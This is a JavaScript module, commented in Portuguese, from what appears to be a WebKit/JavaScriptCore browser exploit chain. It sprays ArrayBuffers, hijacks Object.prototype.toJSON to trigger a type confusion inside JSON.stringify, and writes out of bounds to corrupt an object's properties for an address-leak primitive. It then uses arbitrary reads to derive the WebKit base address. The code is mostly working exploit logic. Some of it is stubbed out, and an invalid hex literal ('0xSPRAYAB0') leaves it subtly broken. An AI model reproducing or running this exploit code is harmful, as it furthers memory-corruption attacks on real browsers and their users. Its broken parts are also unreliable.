// js/script3/testArrayBufferVictimCrash.mjs (R43L - Corrupção de Propriedade de M2 para Addrof)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute, // Usaremos para tentar corromper M2
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_CorruptM2Prop";

const VICTIM_TA_SIZE_ELEMENTS = 8;
// Offsets para tentar corromper M2. São relativos à base do oob_dataview_real.
// O desafio é que não sabemos onde M2 está em relação a essa base.
// Vamos manter o offset que causa TC e variar o valor escrito, esperando que o valor
// possa ser interpretado como um ponteiro se sobrescrever a propriedade correta.
const OOB_OFFSET_FOR_M2_CORRUPTION = 0x7C; // O que causa TC
const OOB_VALUES_FOR_M2_CORRUPTION = [
    // Valores que poderiam ser ponteiros (se a memória for mapeada corretamente)
    // Endereços de estruturas conhecidas (altamente especulativo se vão parar na prop de M2)
    // (JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.JSString_STRUCTURE_ID ? new AdvancedInt64(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSString_STRUCTURE_ID) : new AdvancedInt64(0,0)),
    // Se tivermos um jeito de obter o endereço de target_function_for_webkit_leak ANTES, poderíamos tentar escrevê-lo. Mas esse é o objetivo.
    0x41414141, 0x42424242, 0x43434343, 0x44444444, // Padrões
    0xABABABAB, // Conhecido por causar TC
    0x10000000, // Exemplos de valores que podem ser interpretados como ponteiros (parte baixa)
    // Se soubermos o endereço de um ArrayBuffer do spray, poderíamos tentar escrevê-lo.
];

const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let target_function_for_webkit_leak;
let leaked_address_final = null; // Endereço final obtido
let global_addrof_achieved = false;
let global_webkit_leak_achieved = false;

const SPRAY_SIZE = 128;
let sprayed_abs = []; // Array de ArrayBuffers para o spray

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */ }
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */ }

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Corrupção de Propriedade M2 ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init CorruptM2...`;

    target_function_for_webkit_leak = function someUniqueLeakFunctionR43L_CorruptM2() { /* ... */ };
    leaked_address_final = null;
    global_addrof_achieved = false;
    global_webkit_leak_achieved = false;
    
    // Preparar Spray
    sprayed_abs = [];
    for (let i = 0; i < SPRAY_SIZE; i++) {
        let ab = new ArrayBuffer(32); // Pequenos ArrayBuffers
        let view = new Uint32Array(ab);
        view[0] = 0xSPRAYAB0 + i; // ID
        view[1] = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID; // ID de estrutura de AB
        sprayed_abs.push(ab);
    }
    logS3(`Spray de ${SPRAY_SIZE} ArrayBuffers concluído.`, "info");


    let final_probe_call_count_for_report = 0; // Corrigido: Declarar aqui
    logS3(`--- Fase 0 (CorruptM2): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    /* ... (Sanity Checks - sem alteração) ... */
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);
    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed", /*...*/ }; }


    let iteration_results_summary = [];
    let best_result_overall = {
        errorOccurred: null, tc_probe_details: null,
        addrof_result: { success: false, msg: "Addrof (CorruptM2): Não obtido.", leaked_object_addr: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (CorruptM2): Não obtido.", webkit_base_candidate: null },
        oob_params_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        m2_corruption_details_best: null
    };
    
    for (const current_oob_value_to_write of OOB_VALUES_FOR_M2_CORRUPTION) {
        if (global_addrof_achieved && global_webkit_leak_achieved) break;

        const current_oob_hex_val = safeToHex(current_oob_value_to_write);
        const current_offset_hex = safeToHex(OOB_OFFSET_FOR_M2_CORRUPTION); // Offset é fixo neste teste
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;

        logS3(`\n===== ITERATION CorruptM2: Offset OOB: ${current_offset_hex}, Valor OOB a ser escrito: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
        document.title = `${FNAME_CURRENT_TEST_BASE} Val:${current_oob_hex_val}`;

        let victim_ta_for_json_trigger = null;
        let m1_ref = null; 
        let m2_ref = null; // Será nosso objeto alvo para corrupção de propriedade
        
        let iter_m2_corruption_analysis = {
            oob_value_written: current_oob_hex_val,
            prop1_before_oob: null, prop2_before_oob: null,
            prop1_after_tc: null, prop2_after_tc: null,
            prop2_is_valid_pointer: false,
            leaked_pointer_from_prop2: null,
            notes: ""
        };

        let probe_call_count_iter = 0;
        let tc_detected_this_iter = false;
        let tc_details_this_iter = null;

        function corrupt_m2_probe_toJSON() {
            probe_call_count_iter++; const call_num = probe_call_count_iter;
            const ctts = Object.prototype.toString.call(this);
            // Esperamos que 'this' se torne m2_ref
            const is_m2c = (this === m2_ref && m2_ref !== null);

            try {
                if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };

                if (call_num === 1 && this === victim_ta_for_json_trigger) {
                    logS3(`[PROBE_CorruptM2] Call #${call_num}: 'this' é victim_ta_for_json_trigger. Configurando M1/M2...`, "debug_detail");
                    
                    m2_ref = { 
                        id: "M2_TARGET_FOR_CORRUPTION", 
                        prop_to_corrupt1: 0xAAAAAAA1, // Valor sentinela
                        prop_to_corrupt2: 0xBBBBBBB2, // Valor sentinela, esperamos que este seja sobrescrito
                        target_func_ref: target_function_for_webkit_leak // Para referência
                    };
                    iter_m2_corruption_analysis.prop1_before_oob = safeToHex(m2_ref.prop_to_corrupt1);
                    iter_m2_corruption_analysis.prop2_before_oob = safeToHex(m2_ref.prop_to_corrupt2);

                    m1_ref = { id: "M1_CorruptM2", m2_payload: m2_ref };
                    logS3(`   M1/M2 criados. m2.prop_to_corrupt2 = ${iter_m2_corruption_analysis.prop2_before_oob}.`, "info");
                    
                    // **A Escrita OOB acontece AQUI, depois de M1/M2 serem alocados**
                    // A esperança é que current_oob_value_to_write sobrescreva uma propriedade de m2_ref.
                    // O offset (OOB_OFFSET_FOR_M2_CORRUPTION) é relativo ao oob_dataview_real.
                    // Precisamos de sorte para que m2_ref esteja no local certo.
                    logS3(`   EXECUTANDO OOB WRITE: ${current_oob_hex_val} @ ${current_offset_hex} (tentando atingir M2 props)...`, "warn");
                    oob_write_absolute(OOB_OFFSET_FOR_M2_CORRUPTION, current_oob_value_to_write, 4); // Escrever o valor da iteração
                    PAUSE_S3(50); // Pequena pausa para a escrita ter efeito antes da TC
                    
                    return m1_ref;

                } else if (is_m2c) { // 'this' é m2_ref
                    if (!tc_detected_this_iter) {
                        tc_detected_this_iter = true;
                        tc_details_this_iter = { /* ... */ this_is_M2: true, notes: "TC Confirmada."};
                        logS3(`[PROBE_CorruptM2] Call #${call_num} (M2C): FIRST TC. 'this' é M2 (id: ${this.id}).`, "vuln");

                        iter_m2_corruption_analysis.prop1_after_tc = safeToHex(this.prop_to_corrupt1);
                        iter_m2_corruption_analysis.prop2_after_tc = safeToHex(this.prop_to_corrupt2); // Pode ser um ponteiro agora

                        logS3(`    M2.prop_to_corrupt1 (após TC): ${iter_m2_corruption_analysis.prop1_after_tc}`, "leak_detail");
                        logS3(`    M2.prop_to_corrupt2 (após TC): ${iter_m2_corruption_analysis.prop2_after_tc}`, "leak");

                        if (this.prop_to_corrupt2 !== 0xBBBBBBB2) { // Se o valor mudou
                            iter_m2_corruption_analysis.notes += `prop_to_corrupt2 mudou de 0xbbbbbbb2 para ${iter_m2_corruption_analysis.prop2_after_tc}! `;
                            // Tentar interpretar prop_to_corrupt2 como um ponteiro (assumindo que é a parte baixa de 64 bits)
                            // Para um ponteiro 64 bits real, precisaríamos de 2x leituras de 32 bits ou uma forma de ler 64 bits.
                            // Se current_oob_value_to_write foi um valor de 32 bits, prop_to_corrupt2 conterá esse valor.
                            // Se a escrita OOB atingiu um ponteiro, e current_oob_value_to_write foi a parte baixa de um endereço.
                            // Por agora, vamos apenas checar se o valor parece um ponteiro (não é um dos sentinelas, não é muito pequeno)
                            let potential_low = this.prop_to_corrupt2;
                            let potential_high = 0; // Assumindo que só corrompemos 32 bits. Para um ponteiro real, precisaríamos de mais.

                            // Se assumirmos que a escrita OOB sobrescreveu DUAS propriedades adjacentes (prop_to_corrupt1 e prop_to_corrupt2)
                            // e elas formam um ponteiro de 64 bits:
                            if (this.prop_to_corrupt1 !== 0xAAAAAAA1) {
                                potential_low = this.prop_to_corrupt1; // Assumindo que este é low
                                potential_high = this.prop_to_corrupt2; // Assumindo que este é high
                                iter_m2_corruption_analysis.notes += `prop_to_corrupt1 também mudou para ${iter_m2_corruption_analysis.prop1_after_tc}! `;
                            }
                            
                            let potential_ptr = new AdvancedInt64(potential_low, potential_high);
                             iter_m2_corruption_analysis.leaked_pointer_from_prop2 = potential_ptr.toString(true);

                            if (isValidPointer(potential_ptr, "_m2PropCorruption")) {
                                iter_m2_corruption_analysis.prop2_is_valid_pointer = true;
                                iter_m2_corruption_analysis.notes += `prop_to_corrupt2 (ou par) parece ser PONTEIRO VÁLIDO: ${potential_ptr.toString(true)}! `;
                                logS3(`    !!! prop_to_corrupt2 (ou par com prop1) parece ser PONTEIRO VÁLIDO: ${potential_ptr.toString(true)} !!!`, "success_major");
                                leaked_address_final = potential_ptr;
                                global_addrof_achieved = true;
                            } else {
                                 iter_m2_corruption_analysis.notes += `prop_to_corrupt2 (${potential_ptr.toString(true)}) não é ponteiro válido. `;
                            }
                        } else {
                            iter_m2_corruption_analysis.notes += "prop_to_corrupt2 não foi alterada pela OOB. ";
                        }
                    }
                    return this; 
                }
            } catch (e_pm) { /* ... */ }
            return { gen_m: call_num, type: ctts };
        }

        let iter_primary_error = null;
        let iter_stringify_output_raw = null; // Corrigido
        try {
            victim_ta_for_json_trigger = new Uint32Array(VICTIM_TA_SIZE_ELEMENTS);
            victim_ta_for_json_trigger.fill(0); // Não importa o conteúdo, é só para o trigger
            logS3(`   victim_ta_for_json_trigger criado.`, "info");

            // A escrita OOB é feita DENTRO da primeira chamada da sonda agora.
            // Primeiro, configurar o ambiente OOB.
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
            await PAUSE_S3(50); // Pausa antes de JSON.stringify

            const ppKey = 'toJSON'; /* ... (lógica da sonda TC como antes) ... */
            let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: corrupt_m2_probe_toJSON, writable: true, configurable: true, enumerable: false });
                polluted = true;
                iter_stringify_output_raw = JSON.stringify(victim_ta_for_json_trigger); 
                logS3(`   JSON.stringify output: ${iter_stringify_output_raw ? iter_stringify_output_raw.substring(0,200) : "null" }...`, "debug_detail");
                if (tc_detected_this_iter) logS3(`  TC Probe (CorruptM2): TC CONFIRMADA.`, "vuln");
                else logS3(`  TC Probe (CorruptM2): TC NÃO Confirmada.`, "warn");
            } catch (e_str) { iter_primary_error = e_str; logS3(`  JSON.stringify EXCEPTION: ${e_str.message}`, "error");}
            finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

            if (global_addrof_achieved && leaked_address_final) {
                best_result_overall.addrof_result = { success: true, msg: `Addrof obtido via corrupção de prop M2: ${leaked_address_final.toString(true)}`, leaked_object_addr: leaked_address_final.toString(true) };
                // Tentar WebKitLeak
                if (arb_read) {
                    logS3(`  Tentando WebKitLeak com endereço vazado (assumindo que é target_function): ${leaked_address_final.toString(true)}`, "info_emphasis");
                    // Assumimos que se leaked_address_final é válido, ele é o endereço de target_function_for_webkit_leak.
                    // Esta é uma grande suposição. Se o ponteiro vazado for de m2_ref, precisaríamos de outro passo.
                    // Para este teste, se um ponteiro vaza, vamos tentar usá-lo como se fosse da função.
                    try {
                        const ptr_exe = await arb_read(leaked_address_final.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                        if (isValidPointer(ptr_exe, "_wkLeakExeM2Corr")) {
                            const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                            if (isValidPointer(ptr_jitvm, "_wkLeakJitVmM2Corr")) {
                                const base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
                                logS3(`  !!! POTENCIAL WEBKIT BASE: ${base_candidate.toString(true)} !!!`, "success_major");
                                best_result_overall.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${base_candidate.toString(true)}`, webkit_base_candidate: base_candidate.toString(true) };
                                global_webkit_leak_achieved = true;
                            } else { throw new Error("Ponteiro JIT/VM inválido."); }
                        } else { throw new Error("Ponteiro Executable inválido."); }
                    } catch(e_wk_leak) { logS3(`  Erro no WebKitLeak: ${e_wk_leak.message}`, "error"); best_result_overall.webkit_leak_result = { success: false, msg: `WebKitLeak falhou: ${e_wk_leak.message}` };}
                }
            }

        } catch (e_outer_iter) { iter_primary_error = e_outer_iter; }
        finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }

        final_probe_call_count_for_report = probe_call_count_iter;
        let current_iter_summary = {
            oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            tc_probe_details: tc_details_this_iter,
            m2_corruption_analysis: iter_m2_corruption_analysis,
            addrof_success_this_iter: global_addrof_achieved, // Usar flag global, pois é o objetivo da iteração
            webkit_leak_success_this_iter: global_webkit_leak_achieved,
            heisenbug_on_M2_confirmed_by_tc_probe: tc_detected_this_iter
        };
        iteration_results_summary.push(current_iter_summary);

        // Lógica para atualizar best_result_overall
        if (current_iter_summary.error === null) {
            let current_is_better = false;
            if (best_result_overall.oob_params_of_best_result === null) current_is_better = true;
            else {
                if (current_iter_summary.webkit_leak_success_this_iter && !best_result_overall.webkit_leak_result.success) current_is_better = true;
                else if (current_iter_summary.webkit_leak_success_this_iter === best_result_overall.webkit_leak_result.success) {
                    if (current_iter_summary.addrof_success_this_iter && !best_result_overall.addrof_result.success) current_is_better = true;
                    else if (current_iter_summary.addrof_success_this_iter === best_result_overall.addrof_result.success) {
                        if (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe && !best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) current_is_better = true;
                    }
                }
            }
            if (current_is_better) { /* ... (atualizar best_result_overall como antes) ... */
                best_result_overall.errorOccurred = null;
                best_result_overall.tc_probe_details = current_iter_summary.tc_probe_details;
                best_result_overall.addrof_result.success = current_iter_summary.addrof_success_this_iter;
                if(current_iter_summary.addrof_success_this_iter && leaked_address_final) {
                    best_result_overall.addrof_result.leaked_object_addr = leaked_address_final.toString(true);
                    best_result_overall.addrof_result.msg = `Addrof obtido: ${leaked_address_final.toString(true)}`;
                } else { best_result_overall.addrof_result.msg = "Addrof não obtido no melhor resultado."; best_result_overall.addrof_result.leaked_object_addr = null;}
                if (current_iter_summary.webkit_leak_success_this_iter) { /* WebKit result já está em best_result_overall */ }
                else { best_result_overall.webkit_leak_result = { success: false, msg: "WebKit Leak não obtido no melhor resultado.", webkit_base_candidate: null }; }

                best_result_overall.oob_params_of_best_result = { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: OOB_OFFSET_FOR_M2_CORRUPTION, raw_value: current_oob_value_to_write };
                best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe = current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe;
                best_result_overall.m2_corruption_details_best = current_iter_summary.m2_corruption_analysis;
                logS3(`*** NOVO MELHOR RESULTADO: Off ${current_offset_hex} Val ${current_oob_hex_val} (Addrof:${global_addrof_achieved}, WKLeak:${global_webkit_leak_achieved}, TC:${tc_detected_this_iter}) ***`, "success_major");
            }
        }
        document.title = `${FNAME_CURRENT_TEST_BASE} Val:${current_oob_hex_val} TC:${tc_detected_this_iter} Addr:${global_addrof_achieved}`;
        await PAUSE_S3(50);
    }

    best_result_overall.total_probe_calls_last_iter = final_probe_call_count_for_report;
    best_result_overall.iteration_results_summary = iteration_results_summary;
    best_result_overall.oob_value_of_best_result = best_result_overall.oob_params_of_best_result ? `${best_result_overall.oob_params_of_best_result.offset}_${best_result_overall.oob_params_of_best_result.value}` : "N/A";
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final best_result_overall (CorruptM2Prop): ${JSON.stringify(best_result_overall, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    let final_title = `${FNAME_CURRENT_TEST_BASE} Final: `;
    if(best_result_overall.webkit_leak_result.success) final_title += "WEBKITLEAK_OK! ";
    else if(best_result_overall.addrof_result.success) final_title += "ADDROF_OK! ";
    else if(best_result_overall.heisenbug_on_M2_confirmed_by_tc_probe) final_title += "TC_OK ";
    if(final_title === `${FNAME_CURRENT_TEST_BASE} Final: `) final_title += "NoMajorSuccess";
    document.title = final_title.trim();

    return best_result_overall;
}
